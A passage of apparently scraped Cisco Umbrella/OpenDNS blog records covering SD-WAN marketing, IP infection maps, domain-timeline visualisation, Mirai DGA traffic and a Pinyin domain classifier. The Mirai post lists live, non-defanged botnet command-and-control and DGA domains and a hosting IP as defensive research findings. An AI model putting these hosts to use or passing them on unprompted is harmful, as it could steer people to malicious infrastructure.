is relatively uncongested and may be able to provide faster Internet connectivity. The inability to aggregate disparate links means wasted bandwidth capacity and lower employee satisfaction. A software-defined wide area network (SD-WAN) solution can address these scenarios and provide other advanced routing capabilities to optimize your network traffic as needed. Cisco SD-WAN is a secure, cloud-scale architecture that is open, programmable, and scalable. It quickly allows you to establish an SD-WAN overlay fabric to connect data centers, branches, campuses, and colocation facilities. This connection can improve network speed, security, and efficiency. SD-WAN is a critical networking element in SASE solutions that can direct traffic for the protection of cloud, data center, and branch edge networks. SD-WAN combines and optimizes traditional WAN technologies, such as MPLS and broadband Internet connections. The Cisco SD-WAN overlay fabric allows organizations to efficiently route network traffic to multiple remote branch locations, while providing enhanced monitoring and management capabilities. SD-WAN monitors network traffic across all available links in real-time and dynamically selects the best route for each data packet traversing the network. The drive to improve network and application performance to the user has converged with the drive to secure the same user at the edge. A secure internet gateway (SIG) delivers a broad set of security from the cloud so organizations can protect users no matter where they are. It can easily scale to cover additional traffic and users more efficiently than previous technologies. This convergence of networking and security functionality at the edge has led to an even more encompassing concept that Gartner has defined as secure access service edge (SASE). A SASE solution can secure the cloud, data center, and branch network edges and deliver a secure SD-WAN fabric across disparate connections. So, you’ve just finished reading this blog. Why stop now? If you’re lucky – you’ll read our new ebook before anyone else at your company, and you’ll gain a reputation as a networking and security expert who can talk about SASE with the best of them. Who doesn’t love to be a hero? Ready to get started on the journey? Click here to download the ebook.", "date": "2020-09-01"},
{"website": "Cisco-Umbrella", "title": "Internet Territories: Introducing IP Infection Maps", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/internet-territories-introducing-ip-infection-maps", "abstract": "[load-javascript slug=”mathjax”] Have you ever wondered what the IP distribution looks like ? When it comes to network security research, we usually find ourselves looking at wide IP address sets. Often, we’re interested in understanding the distribution of the IP addresses we are looking at in terms of geolocation as well as IP prefixes/ranges. For example, in our studies of the Kelihos botnet or the Cryptolocker ransomware, we can gather a list of the infected client IPs and observe the impact of the infection. It definitely helps us appreciate the magnitude and the nature of the problem. Before we go into more details and interpretations, let’s introduce our layout technique and some important facts about the Internet. Geometric concept IP to 2D space An IPv4 address is made of 4 natural numbers between 0 and 255. In the mathematical sense, it can be seen as a 4-dimensional integer vector. [I = left ( mathbb{Z} cap [0, 255] right )^{4}] Now, the whole idea is to build a function f to transform this IP into a 2-dimensional real vector. Then if we take the whole IP set and apply this transformation to every IP, we will build a 2D point cloud that will represent our IP set. [f : I rightarrow mathbb{R}^{2}] In other words, it is a projection of the IP space into the [mathbb{R}^{2}] space. There are many ways to do so—today we’re going to present a few approaches. But first, let’s rescale our IP addresses to be a bit more manipulable. [Let i in I,  i = [A, B, C, D]\\Let j = frac{1}{255}i = frac{1}{255}[A, B, C, D] = [a, b, c, d]] Great! Now we have an IP address (a, b, c, d) where every component is rescaled between 0 and 1. Now let’s define our transformation function: [f(a,b,c,d) = left{begin{matrix}(r + wb)cos alpha + r’dcosgamma\\(r + wb)sin alpha + r’dsingamma\\end{matrix}right.] with [left{begin{matrix}r = 32 rightarrow inner radius\\ r’ = 0.5 rightarrow disk radius\\ w = 255 rightarrow arc width \\ end{matrix}right.] and [left{begin{matrix}alpha = frac{7pi a}{4}-frac{3pi}{8} rightarrow arc angle\\gamma = 2pi c rightarrow disk angle\\\\end{matrix}right.] These formulas may scare you if you haven’t done trigonometry in a while but it is actually very simple. The function can be split in two parts : [f(a,b,c,d) = left{begin{matrix}(r + wb)cos alpha\\(r + wb)sin alpha \\end{matrix}right.+left{begin{matrix}r’dcosgamma\\r’dsingamma\\end{matrix}right.] The first part is the definition of our arc using polar coordinates. We use an inner radius and a width variable to control its shape. The second part is the definiton of a disk in polar coordinates as well. What we have here is the definition of two systems: one using A and B to find a position in the arc given a certain inner radius and width, and the other one using C and D to find a position around the former point given a certain disk radius. A and C are rescaled on the trigonometrical circle to define angles, B and D are used as distances from the origin (radius). In simpler words : The arc represents the whole IP space (center right is 0.0.0.0, center left is 255.255.255.255) A line from the center represents an A.*.*.* IP range A point in the arc represent an A.B.*.* IP range A bright point represents a denser /16 prefix in A.B.*.* A dim point represents a sparser /16 prefix in A.B.*.* Coloring Now we have a point cloud built from an IP set, how do we color it ? First we give a color to every point. In our case, the color represents either a continent code or a country code. It could be something completely different. Then, for each pixel of the texture, we search for the nearest point in the cloud and take its color. This structure is also known as a Voronoi diagram, and it’s heavily used in area analysis and computational geometry. In our case, we’ll use it to represent continent or country territories. Here is what a Voronoi diagram looks like : To obtain the final result, we need one last thing. We scale the pixel color relatively to its distance to its nearest point to achieve the gradient effect. Note, however, that we don’t necessarily have to use the Euclidian distance for our purpose; different distance functions will give different outputs (Ex: Manhattan distance). In our case we use the logarithm of the euclidian distance: [Let overrightarrow{P} be our current pixel position\\ Let overrightarrow{N} be the nearest point position\\Let overrightarrow{D} be overrightarrow{P}-overrightarrow{N}] [tint(overrightarrow{D}_{x,y}) = frac{1}{log(1 + sqrt{x^{2} + y^{2}} + varepsilon) } with varepsilon > 0\\\\color(overrightarrow{P}) = tint(overrightarrow{D}) * overrightarrow{N}_{color}] Internet territories Now that we have our geometrical model ready to go, we would like to use it on a couple of datasets. But before we do that we need to focus on a very important point in order to make an accurate diagnosis. Consider the two pictures below : The first one is a continent view (Colors are Continent Codes), the second is a country view (Colors are Country Codes) | These pictures have been created by generating 10000 random IP addresses with a uniform distribution : def populate_random_ips(count): for i in range(count):\n        a = random.choice(range(0, 255)) \n        b = random.choice(range(0, 255))\n        c = random.choice(range(0, 255))\n        d = random.choice(range(0, 255)) load_ip(str(c) + \".\" + str(d) + \".\" + str(a) + \".\" + str(b)) Then, we use the GeoIP library to get a continent and country code. We associate one color for each code and run the same layout process. NOTE : The bright white color represent the reserved IP areas and the grey color represents the values that don’t have a continent or country code. Remarks / Interpretations : The bright white color represents the reserved IP ranges : 0.0.0.0/8 for broadcast messages 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 : Local communications within a private network 127.0.0.0/8 : Loopback addresses 240.0.0.0/4 : Reserved for future use 255.255.255.255/32 : Reserved for limited broadcast Etc. For more details on the reserved address spaces : http://en.wikipedia.org/wiki/Reserved_IP_addresses Some continents occupy much bigger/smaller areas in the IP space than others. Asia (Yellow) and Europe (Light blue) split into dozens of countries from the continent to the country view. Africa (green), South America (red) and Oceania (pink) are clearly less predominant in the IP space. We can see the IP frontiers in isolated points. Some pink points (Oceania) inside the big yellow space (Asia) represent Indonesia and some yellow points in the light blue (Europe) area represent Eastern Europe. To summarize, it is a well known fact that the IP distribution is obviously not uniform and we need to keep this crucial fact in mind to appreciate the next datasets. IP Infection maps Now let’s present a couple of infected IP sets gathered by the Research Team and let’s see some interpretations. The first picture is the continent view, the second is the country view. Note that the color code is not necessarily the same in each country view. 1. Cryptolocker (843 IPs) This IP set is a list made by our researcher Ping of all the client IPs infected by the Cryptolocker ransomware in one single day (Oct 30th) For more details on how Ping built this dataset, please click here . Interpretation The infected clients are mostly located in North America and Europe. The first thing we notice is that the continent view and country view look pretty similar, in the global IP map (first picture of this blog), we can see that the big light blue range splits into many different countries which is interestingly not the case here since the ransomware has predominantly infected machines in the UK. And finally, we can see that the US was the most infected country. 2. Weight Loss Scam (6049 IPs) This IP set is a list our researcher Frank made of IP addresses hosting malicious content (Weight Loss Scam) taken from July 7th to today. Interpretation : Here we can clearly see a relatively strong presence in South America,  Africa. Given the small proportion they represent on the IP world map (First picture of this blog) the vivid green and red colors are noticeable. The machines are spread out in Europe and Asia have been infected  (Notice the light blue and yellow subdivision into many different colors in the country view) and also very present in the US. 3. Kelihos (42244 IPs) This IP set is a list made by our researcher Dhia representing all the client IPs infected by the Kelihos botnet. For more details on how Dhia built this dataset, check out our Kelihos blog posts ( 1 ) and ( 2 ). This one is clearly amazing. Since it contains more than 40,000 IPs, we would have expected a wide distribution but this is not the case here. This means the Kelihos botnet has infected a lot of sub networks and /16 prefixes. We notice a very strong presence in Europe, Asia and more precisely Eastern Europe (yellows in light blues). Almost nothing in Oceania (a single pink dot) and also a weak presence in the US (given the proportion of IPs it represents). Conclusion To conclude, we presented an interesting way to correlate geolocations and IP addresses of various datasets using some trigonometry and graphics knowledge. In further experiments, it would be interesting to use the colors to visualize something else (Ex : ASN, IP reputation score etc.). Also, since this layout is using only 2 dimensions, one way to improve it is to use the third dimension to represent other metrics (Ex : Traffic, DNS requests etc.).", "date": "2013-11-18"},
{"website": "Cisco-Umbrella", "title": "Visualizing the Evolution", "author": ["Chen Ye"], "link": "https://umbrella.cisco.com/blog/visualizing-the-evolution", "abstract": "Evolutionary data is a collection of past events and circumstances. Understanding it can be extremely valuable, because it reveals history, brings insights to the present, and often times forecasts the future well. In this post we’ll outline some useful techniques for visualizing evolutionary data and provide tips to make a powerful impact. The data At OpenDNS, we possess a huge amount of evolutionary data for domains. First of all, we see every single query our customers have made, which depicts the query volume and the change of infrastructure for one domain over time. We also keep record of key timestamps, for example, the time when a domain firstly appears in the query logs. Then, malicious domains usually have more interesting data: e.g., the time when they get blocked by us. Lastly, we have the most complete record of whois data about one domain, from the moment a domain is registered, to its expected expiration date. For continuous evolutionary data, such as a domain’s query volume over time, a simple line chart would be effective enough. In this blog, we are particularly interested in the other type of evolution data: time-to-event data, for instance, the time when a domain is created, or the time when a domain is flagged by us or another source. Security researchers at OpenDNS have been using this data for their work in the past . We’ve published a previous blog about visualizing the life for one domain, but it’s important to look at things at large scale. By visualizing the time-to-event data for group of domains, we are able to find patterns and outliers, and re-examine our models. The visualization There are two types of graphs in this visualization tool. The first one is a group timeline (see figure 1 ) . The idea is simple: firstly we draw a timeline for every event type, then for each domain, we mark the timestamp of an event on its own timeline with a circle, finally use line to connect all the events (circles). Therefore, each line on this graph represents one domain’s evolution. The slope of the line indicates the chronological order of events. In fact, when you only have two events, it’s a SlopeGraph invented by Edward Tufte. Figure 1. Group Timeline The second type of graph, box plot, is a purely scientific way of showing the distribution of numerical data. To draw a box plot you need to calculate five statistics of your data: minimum, first quartile, median, third quartile, and maximum, see figure 2 below. Data points outside the range from minimum to maximum are outliers. A box plot shows rich information within limited space, and is particularly useful for comparison between multiple sets of data. On the other hand, it does take some effort to interpret it for first-time viewers. Figure 2. A box plot Using this tool, you can choose any pair of event types from your dataset, and it will calculate the time interval (number of days) between them, and draw the box plot. Use Cases Model Efficacy Analysis Our security researcher Jeremiah implemented NLP-Rank , a model good at catching phishing domains. Let’s visualize a sample of malicious domains NLP-Rank has caught recently (See figure 3). Figure 3. ODNS first_seen to ODNS first_tag On the timeline, you will notice most of them are vertical lines, indicating no latency between when OpenDNS observes a domain for the first time (ODNS first_seen) and when we blocked it (ODNS first_tag), because nlp-rank is able to flag a phishing domain the moment it appears in our logs. The box plot is echoing this result with all the statistics equal to 0 day. However, the lines with irregular slope on the timeline (highlighted in orange) stand out, which correspond to the negative outliers on the box plot. In fact, there are a few complex reasons behind their existence. The main one is when a phishing domain was observed for the first time but it was not serving content yet, so we cached the domain after which it started a phishing attack. The second reason for negative outliers is that processing large logs can introduce some latency. Sometimes a phishing domain is live just for couple hours, and when we try to retrieve content, it’s already down. Lastly, we might also miss things during the gap when researchers maintain and upgrade the model. Now let’s cross-check OpenDNS response with VirusTotal’s feed, by adding another event type from VirusTotal: the first time when VirusTotal detects a malicious url that has positive detections(VT_FirstFlag). Figure 4. OpenDNS first_tag to VirusTotal first_flag First of all, out of 267 domains, VirusTotal returns first_flag results for 165 of them. In figure 4, looking at the box plot, the box (the lower to higher quartile) is located on the negative side of the scale, along with more negative outliers, which indicates that nlp-rank caught these domains earlier statistically. Accordingly, these domains have lines with negative slope on the group timeline. However, there are positive outliers, which is worth further investigation. Exploit Kits Analysis Figure 5. Exploit Kit Domains Following the same method let’s analyze some recent exploit kit domains.  In figure 5, we can quickly identify a few things: We usually block a EK domain a few hours after we see it. Our results are basically aligned with VirusTotal, as in the second box plot, most of the statistics are zero. Figure 6. From Creation to Becoming Active Now if we add another ingredient, the time a domain gets registered (Registered), the correlation becomes interesting. In figure 6, most domains were only “put into use” a certain period of time after they were registered, from a few days up to almost a year. This happens because attackers hijacked benign domain registrants and then create subdomains for their malicious content. This technique is also referred to as domain shadowing .  However, a small family of domains are not using domain shadowing but instead are freshly created for dedicated delivery of exploit kits. They are highlighted in orange in figure 6, and listed as below if you are interested: bqa2h6.f298wh[.]top jw1f0y.wkfroa[.]top qp5gwu.masihae[.]top rn58cb.f298wh[.]top yca6j8.masihae[.]top zx5wlc.wkfroa[.]top Design Through the above use cases, we demonstrated how visualizations such as box plots and slope graphs could be used in security research.  However, to make them even more enticing, these visualizations can be expanded by using a few interaction techniques to facilitate people explore their own dataset. Filtering & Sorting Often times visualizations provide the big picture, and ideally point out the direction of your next step. In this tool, filtering allows you to cross out some events that are not relevant, and give focus to the “real meat” of the analysis. In addition, the ability to sort the timelines helps users find interesting correlations between two adjacent timelines events, which would be difficult to find in a text-only format. Details on demand Instead of calculating a box plot for each of the two events, the tool will provide this extra information when you want it, and you are free to select any pair of metrics matter. Hovering to highlight and view domain detail is also supported. Coloring Although we didn’t apply colors in above examples, coloring can provide the users more useful information. You can use color to represent different sets of domains, so it’s easy to compare. Or, you can even use a linear color scale to represent quantitative data. In figure 1, the coloring is actually encoding the creation date, so the older the redder. Next Steps In this post, we analyzed phishing domains and exploit kit domains. Another interesting analysis is to compare the evolution pattern for different sets of the domains, such as domains by different attacks, threat types or classifiers. Furthermore, If we could put this specific slice of data into a larger context, use it with other type of data, for example the query volume over time and the neighborhood connections within a large graph, it would reveal a clearer picture of the domains in question. However, it will certainly bring up more challenges to design, as we want to display more information but maintain systematic simplicity and great user experience at the same time.", "date": "2016-11-03"},
{"website": "Cisco-Umbrella", "title": "The Query Volumes of Mirai DGAs", "author": ["David Rodriguez"], "link": "https://umbrella.cisco.com/blog/query-volumes-mirai-dgas", "abstract": "The Network Security Lab at 360 provided evidence that the Mirai botnet has a built-in domain generator algorithm (DGA) feature. In this blog, we share some of what we learned about frequent traffic patterns of Mirai DGA domains. In brief: Mirai DGA domains may see up to 10K queries per hour. A frequent pattern is seen where Mirai DGA domains initially appear within a day, then re-emerge in a sustained period of query volume. We began to see Mirai DGA query volumes spike after December 2 (although the .pw variant appears to have shown up a couple days earlier). On December 8, Mirai hard-coded C2 domains displayed a coordinated spike in query volume. A quick note: these conclusions were generated from our unique traffic and may be different from conclusions drawn by others performing a similar analysis. CLIENT IP – DOMAIN GRAPH To find these DGA domains, we pivoted off known hardcoded C2 domains used by Mirai: zugzwang.me tr069.support tr069.online tr069.tech In addition, we found another tr069 with a different TLD: tr069.pw Leveraging our distributed bipartite Client IP-Domain graph we found client traffic which overlapped these hard-coded domains with wordless domains – the DGA domains. From mining this graph, we were able to find DGA domains with highly similar traffic patterns. In fact, in a later analysis we found a majority of these domains (at one time) hosted on the IP: 93.190.142.201 which we first saw on December 5 at 05:54 UTC. SAMPLED DOMAINS Here’s a sample of 4 top-level domains (TLDs) with what appear to be Mirai associated domains – tech , support , online , and pw . More specifically, we will discuss query volumes from this sample of domains: lvfjcwwobycj.tech vmdefmnsndoj.tech nympompksmfx.tech qjqubpciajoc.tech oornsduuwjli.tech exvdaajegjur.support xpknpxmywqsr.support bpmsfckfkrpr.support bwhrdaumwuvn.support xpknpxmywqsrhe.online kedbuffigfjs.online srrys.pw binpt.pw kciap.pw mziep.pw QUERY VOLUME VERSUS CLIENT VOUME The query volume is a raw count of the total number of processed DNS requests for a domain, which may include repeat visitors. In this analysis we group queries by hour. This is in contrast to a related count, the client volume, which tracks unique visitors to a domain – similarly, grouped by hour. For example, here’s an example of the unique number of clients querying the Mirai C2 domain zugzwang.me over the last 7 days in the USA: FIGURE 1 : Unique USA client volume querying zugzwang.me in the last 7 days. Similarly, here’s the USA client volume to tr069.pw in the last 7 days: FIGURE 2 :Unique USA client volume querying tr069.pw in the last 7 days. Notice, the number of clients within the USA querying these domains varies: one domain had a maximum within one hour around 15 clients, while the other 2 clients. In contrast, the plots below show the total query volume for individual domains grouped by hour. REFERENCE DOMAINS For reference, you might wish to know the traffic patterns of the C2 domains mentioned above. The query volumes are taken from aggregating all the queries processed in our resolvers around the world. FIGURE 3 : zugzwang.me FIGURE 4 : tr069.support FIGURE 5 : tr069.online FIGURE 6: tr069.tech FIGURE 7 : tr069.pw It appears that on December 8, Mirai hard-coded C2 domains displayed a coordinated spike in query volume. Next, we’ll look at query volumes from a sample of Mirai DGA domains. TLD: tech The first TLD we look at is tech . We show 5 different domains with what appears to be 4 different traffic patterns. FIGURE 8 : lvfjcwwobycj.tech FIGURE 9 : vmdefmnsndoj.tech FIGURE 10 : nympompksmfx.tech FIGURE 11 : qjqubpciajoc.tech FIGURE 12 : oornsduuwjli.tech TLD: support The second TLD we look at is support . We show 4 different domains with what appears to be 2 different traffic patterns. We note, these traffic patterns overlap with those of tech . FIGURE 13: exvdaajegjur.support FIGURE 14: xpknpxmywqsr.support FIGURE 15 : bpmsfckfkrpr.support FIGURE 16 : bwhrdaumwuvn.support TLD: online The third TLD we look at is online . We show 2 different domains, each with a different traffic pattern. We note, these traffic patterns overlap with those of tech & support to some extent. FIGURE 17 : xpknpxmywqsrhe.online FIGURE 18 : kedbuffigfjs.online TLD: pw The last TLD we look at is pw . We show 4 different domains, each with a different traffic pattern. We note, these traffic patterns appear like some of those of tech , support , and online . We point out that srrys.pw appears earlier than December 2, 2016 and binpt.pw has more sustained traffic than previously discussed domains. FIGURE 20 : srrys.pw FIGURE 21 : binpt.pw FIGURE 22 : kciap.pw FIGURE 23 : mziep.pw Notes: We also found a couple other domains which may interest other researchers. Since these domains don’t appear to be generated by the same DGA, they don’t appear above. The two other domains are: FIGURE 24 : mufoscam.org FIGURE 19 : novotele.online", "date": "2016-12-13"},
{"website": "Cisco-Umbrella", "title": "Machine Learning in Security Part 1: Language Model Detection in Domains", "author": ["Jeremiah O'Connor"], "link": "https://umbrella.cisco.com/blog/detecting-pinyin-domains", "abstract": "At OpenDNS our resolvers are flooded with massive amounts of Chinese domains on a daily basis, many of which security researchers are unfamiliar with. One of the projects our team was initially tasked with was to come up with a method to filter these Chinese domains out from the rest of the traffic in order to reduce the false positive rate for our classifier algorithms and to potentially detect IPs exhibiting spamming or search engine optimization (SEO) behavior. Pinyin is the official phonetic system for transcribing Mandarin pronunciations into the Latin alphabet; it is one of the ways to represent Mandarin or Cantonese on the Internet, specifically in DNS. In certain cases it is very hard to detect Chinese or Pinyin domains, and most language identification tools are unable to solve this problem effectively. In order to tackle this problem we used the “bag of words” approach, and also used machine learning techniques such as N-gram modeling and Naive Bayes Probability to build an algorithm to classify these domains as Pinyin. Pinyin, or Hanyu Pinyin, is the official phonetic system for transcribing the Mandarin pronunciations of Chinese characters into the Latin alphabet in the People’s Republic of China, Republic of China (Taiwan), and Singapore. More information about Pinyin can be found on Wikipedia . Parallels can be drawn between programmatic language detection and the way a human would recognize a language. Before describing the algorithm we designed, let’s discuss a scenario that will build intuition about how language detection algorithms work. Imagine you are walking down the street and there is a person walking in front of you talking on a cell phone in a different language. From the first few phrases out of that person’s mouth, you begin to recognize the language but are not exactly sure what it is. At what point are you certain about what language the person is speaking? In theory, the way a human recognizes language is the exact same way you would program a machine to do it. For example, saying “how are you?” in Spanish is “como estas?”, but in Portuguese it’s “como vai” and in French it is “comment ca va?”. Since the first word in each phrase sounds the same, you wouldn’t be able to really discern the difference until you hear the next word. This is very similar to the way a computer processes languages: it will have to identify the words character by character, breaking down prefixes, suffixes, and words and match them to its own “memory bank” (corpus). Background/Problem: N-gram modeling is a machine learning technique widely used for natural language processing—some examples include spelling correction and searching. Most recently, it has become popular in building security incident detection and monitoring systems. The reason it’s called N-gram is that the algorithm works on N sized character blocks; a 1-token sequence would be a unigram, 2-token sequence, bigram, and an n-token sequence, an n-gram. Typically, when doing language classification, you are classifying a text (documents, webpage, book, article, etc.), and you are training your algorithm on multiple texts written in a specific language that are usually very long in length (e.g. Moby Dick, Paradise Lost, etc.). Identifying the language of a specific domain presents a harder problem to solve, because it’s much shorter in length than having a whole document full of characters of a certain language. Relating it back to the cell-phone example above; if you were only able to hear a 10 words out of the conversation it would be much harder to accurately identify the language than if you heard 200 words. Also,  domains are written in a sort of “Internet Language”, and often contain a lot of numbers, so another thing to take into account was to craft our own version of Pinyin, which is Pinyin text from articles/books combined with domain names. Corpus Generation: One of the most crucial aspects of building classifier algorithms is coming up with a solid corpus to train your function on. A corpus is essentially the algorithm’s past experience with the language, and the training stage is where you teach your algorithm that language. It would be a similar comparison to the cell-phone example above. Say that the reason you are able to recognize the language is because you spent a few years in a foreign country. You may be able recognize different dialects, and be able to discern between Spanish as spoken in Spain from Spanish spoken in Latin America, or the differences between Brazilian Portuguese and European Portuguese. Since this was not the traditional method of language detection, we had to define our own language model, a combination of Pinyin domains and Pinyin language found in books or articles written in Pinyin to add as a supplement. As part of this research we have 3 different types of corpora: -Plain Pinyin text -Known Pinyin Domains -Chinese Language Domains not necessarily Pinyin (mostly comprised of domains with a lot of numbers) It is very important when building your corpus to craft it very precisely, and not allow for any deviations from what you’re trying to identify. We had to search far and wide on the web for Pinyin texts. Luckily, many of my classmates are from China, or are Chinese-Americans, and were able to direct me to some great resources. Currently we have 3 corpora. One is just a text corpus which is what we might train on for language classifiers. The other was more of an Internet language corpus comprising of Chinese domains. The only problem is some of the Chinese/Pinyin domains just comprise of numbers. The third is a specialized corpus of Chinese domains that consist mostly of numbers, and very few alphabetical characters (ex. 58493.com.cn). Additional Feature Detection: We added some supplemental feature-detection on top of our classifier to improve the total score for domains where the language is harder to identify. These features were based off geo-location “hints” extracted from the DNS log data. Here is where we took into account certain features the domain exhibited, for example: .cn in the TLD, or if the country the IP of the domain resolved to the countries China, Hong Kong, or Taiwan. I used PyGeoIP/MaxMind library to do the country lookups. In addition, I also filtered out puny code domains for future analysis, where the SLD start with “xn—“. Another feature I am starting to design is what I call “giveaway” words, for example, “zhuong”, “xiang”, “zheng” etc. These substrings carry a higher weight and are more unique to Pinyin than other languages, increasing the probability that the domain is Pinyin. The intuition here (going back to the cellphone example), these would be words or sounds you would hear in the conversation when as soon as you heard them, you would instantly recognize the language. Usually they’re very unique to the language, not many other languages would have “zhang”, “xiong”, etc. Scanning through domains for additional words will effect performance, a better alternative would be to assign higher weights to certain trigrams and bigrams. This will require a more in depth analysis of the Pinyin language and the way it’s constructed. Building the Classifier: Step 1: Cleaning the data One of the first things to do when building a text classifier algorithm is to “clean” the data as best as possible. Traditionally we would be working with large texts and, in the preprocessing stage, we would first filter out “stop words” (ex. the, a, than, etc.). Since we are working with domain data, we decided to treat the TLDs as “stop words” and filter those out, as well as all the periods (“.”) for classification. Depending on what type of Chinese domains we are looking for we can strip out the numbers and the dashes. We then break up the domain into bigrams, trigrams, and quad grams and add those into separate dictionaries. Most of the algorithm’s text analysis will be done on the SLD (second-level domain) and the other subdomains attached to that. We then go through and divide. Step 2: Calculating the probabilities The next step is to go through and check the if the bigram, trigram, quad gram exists within the corpora. The following calculations are then employed to compute the probabilities for all the grams: As you can see from the formulas above, the quad grams have a higher weight, being multiplied by 3, trigrams are multiplied by 2, and no weight attached to bigrams. This make sense because the longer the string, especially if it’s more unique, the higher the probability it is a part of a specific language. Step 3: Adding in features calculating total score Finally, we went through and summed up all of the probabilities of the all the grams, per domain, and factored in the scores for the additional features to compute the total score per domain. Sample Output for 10,000 domains Domain Pinyin Probability Score vwudz.enshi0.cn. 0.005836117 files-webcars-com-cn.powercdn.cn. 0.005729309 elvshangjun.cn. 0.005141224 anshanbanxueliwenping.gov.cn.xuspnx.com. 0.005133575 7az0e.fuzhuang278.cn. 0.005082791 t.hefei.cc. 0.005081406 shexiang9.cn. 0.00506026 592.33qyi.fuzhuang206.cn. 0.005012791 huishui.novadigital.cn. 0.004977142 vasba.edu.cn.dkcciau.com. 0.004937082 www.qingbiji.cn. 0.00485009 talk.weibo.10086.cn. 0.004801779 873.41699.win2016.cn. 0.004795111 fcxlb.dianziyouxi11886.org. 0.004777545 3h48.news.qqparty.com.cn. 0.004717036 ezdvv.dianziyouxi11886.org. 0.004713618 egpfm.dianziyouxi13886.org. 0.004713618 dpmyt.dianziyouxi13886.org. 0.004713618 abbhqyt.huangguantouzhudailiwang.cn. 0.004693812 fulltech.com.tw. 0.004587503 317.57836.fuzhuang128.cn. 0.004560346 51121.fuzhuang186.cn. 0.004560346 www.cn-dajiang.com. 0.00449607 roll.caijing.com.cn. 0.0044836 866.4w6uo.tianlisujiao.com. 0.004483468 shhongzhuang.com. 0.004377925 s73q9.huihuangcaxie.cn. 0.004355986 www.cnkingtone.com. 0.004335397 www.02328.cn. 0.004333471 326.6d3ih.fuzhuang376.cn. 0.004316031 www.xinlvxing.com.cn. 0.004270074 1vp6s.beiwei39du.cn. 0.004250109 jinlongqipaiwohaoxiangzhidao.flxc.net. 0.00424021 www.cnsyhz.com. 0.004237153 hugeman.ekymnt.cn. 0.004232029 jianfei21.com. 0.004216755 henanyongtanduojinzhibo.131uu.cn. 0.004182583 www.bdmedia.cn. 0.004104624 tianzhi.com. 0.004097529 www.022w.cn. 0.004021225 dvlnb.whwxbj.cn. 0.00400433 t.mala.cn. 0.004002096 acbyqtj3h5.l20.yunpan.cn. 0.003999642 yutai.0535rc.com. 0.003986877 www.hljzp.net. 0.003984501 684.sa9c0.fgtolu.cn. 0.003970125 8371.n4o6j.huangmayulecheng1.com. 0.003961966 emogo.cn. 0.00395232 bj43b2b.dns4.cn. 0.003913787 qiche2010.com. 0.003907618 szkanne.com. 0.003906845 31688.fpbmkb4.cn. 0.003899726 www.thefox.cn. 0.00389916 www.adminsl.cn. 0.003898344 ptyyyssc.sdtjzk.com. 0.003848159 acvqh.gxuro.com.cn. 0.003845223 155.91178.chenghaijinguangwanju.qdsrrh.cn. 0.00383204 www.eetop.cn. 0.003821803 fengxipingzhaigongsi.cpnys.cc. 0.003819816 mi.cn. 0.003816321 www.s-zone.cn. 0.003815913 bbs.yzg.ely.cn. 0.003810671 78061.eiwqutrancz.cn. 0.00381022 huikangsc.com. 0.003810175 www.xnw5.cn. 0.003808215 profdcb48.websitecname.cn. 0.003799702 56api8h64.dfvfdsk.cn. 0.00378904 19078.meijianail.com. 0.003786749 zhsm12198.com. 0.003782171 www.zymjr.com.cn. 0.003775527 7ch.cnjc56.com. 0.00377101 795.39680.01tch.cn. 0.003769193 i.wo.com.cn. 0.003768649 7doe.cnjc56.com. 0.003768238 www.vmarketing.cn. 0.003768144 blog.libruce.cn. 0.003767259 host1.ynicp.cn. 0.003764843 jw.cicc.com.cn. 0.00376439 d0j3eku.dfupcun.cn. 0.003764302 sun01.f5.sinosure.com.cn. 0.003763847 id.ekymnt.cn. 0.003762709 freesimplehandmade.com. 0.00376204 kis74.8d35.cn. 0.003761579 t.rednet.cn. 0.003760458 mail.sz2g.cn. 0.003758049 2bw7ok.betaclub.cn. 0.003757989 56591.nnoxxv.cn. 0.003757969 bytgdcfsqrj.adaxnw.com. 0.00375755 t.sz.net.cn. 0.003756152 beidougpsweixingdingwei.870118.com. 0.003755757 kxovz.sxjlb.cn. 0.003755744 t.jatxh.cn. 0.003755336 6og6.502550.cn. 0.003755097 lwmcs.cnsh123.com. 0.00375438 www.fgyt.cn. 0.003754163 zcjsjrj.com. 0.003753777 bcaxzqy.nopevcd.cn. 0.003753239 www.bhgmag.com.cn. 0.003752705 1001040177149.027jd.cn. 0.003752521 zhld.com. 0.003752209 51110.nphjw.cn. 0.003752068 bbs.lcxw.cn. 0.003752 dbfhutx.eofvfr.cn. 0.003751464 szgdb.cn. 0.003751159 cd.gccdn.cn. 0.003750377 iphone4dingweizhuizongwangzhi.sjk138.com. 0.003715294 linyibanyingyusiliujichengjidan.h4dzsv.com. 0.003573521 jzlejia.com. 0.003478708 zongtongyulechengbaoma.taijichan.com. 0.003470566 www.win-in-shanghai.com. 0.003400833 huangguantaobaowanganquanma.2014sk.com. 0.003398596 kid.tcdn.qq.com. 0.003394156 jj7lr.shhaifeng.com. 0.00332892 huangguanxianjinwangh.73212.48973.com. 0.003242515 yulinbanwangshangkechawenping.tggomsl.com. 0.003201924 286.putong.zhiwen79.in. 0.003172524 xm-yuanyang.com. 0.003152139 www.uralhelicom.com. 0.003145724 chongqingbaoyang.com. 0.003139086 jrjiaomu.com. 0.003103858 sanlichen.com. 0.003095998 compuhom.com. 0.00305815 yangshengw.net. 0.003053929 ejiacheng.com. 0.003036892 wwwppnbacom.bkk456.com. 0.003010301 dyn-dsl-pt-98-124-47-5.nexicom.net. 0.003007465 nujiangbanbenkebiyezheng.xuspnx.com. 0.002981089 spiritcommunicator.com. 0.002965862 themealmobile.com. 0.002919905 hejianbanjiajiehunzheng.bk6zs.com. 0.002896148 petunione.com. 0.002880016 hot.xinggan.com. 0.00274529 ka5f9.4er17.tianlisujiao.com. 0.002741001 bbs.57xizang.com. 0.002728393 hakkeka.com. 0.002725519 taiziyulecheng18.bbs.227623.com. 0.002669892 drneilmd.com. 0.002666576 invisiblefence-com.webmail.emailsrvr.com. 0.00260573 82725.eufhhr.com. 0.002603327 awanggo.com. 0.002599609 shssl30fkj.shhxjf.com. 0.002598443 zhongguozuqiuduijinqibisai.57138.in. 0.002582069 shenyangbanjiashizheng.pgetkm.com. 0.002531125 vice.duoshuo.com. 0.002498526 yunguichuantiantianlezoushitu.maximschina.cn. 0.002484479 amarpai.com. 0.002435753 shlanyuan.com. 0.002433683 www.mchenryhd.com. 0.002432575 res.mashangju.com.w.alikunlun.com. 0.002427826 fudun.com.tw. 0.002426019 kuaicaile.aomendubojiqiao128168.com. 0.002419035 wwwzd699com.ejer3.com. 0.002392149 nissan-huasheng.net. 0.002379231 kuchetabg.com. 0.00234786 leifenggaoshoutanxinshuiluntan.70539.in. 0.00234699 danyangglassesline.net. 